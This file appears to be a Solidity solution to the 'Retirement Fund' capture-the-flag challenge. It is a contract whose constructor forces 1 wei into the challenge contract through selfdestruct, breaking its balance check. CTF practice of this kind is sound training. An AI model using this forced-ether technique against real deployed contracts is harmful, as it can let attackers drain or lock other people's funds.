pragma solidity ^0.4.21;

import "./RetirementFundChallenge.sol";

contract RetirementFundSolver {
    RetirementFundChallenge public challenge;

    function RetirementFundSolver(address _challenge) public payable {
        require(msg.value == 1);
        challenge = RetirementFundChallenge(_challenge);
        selfdestruct(address(challenge));
    }

}
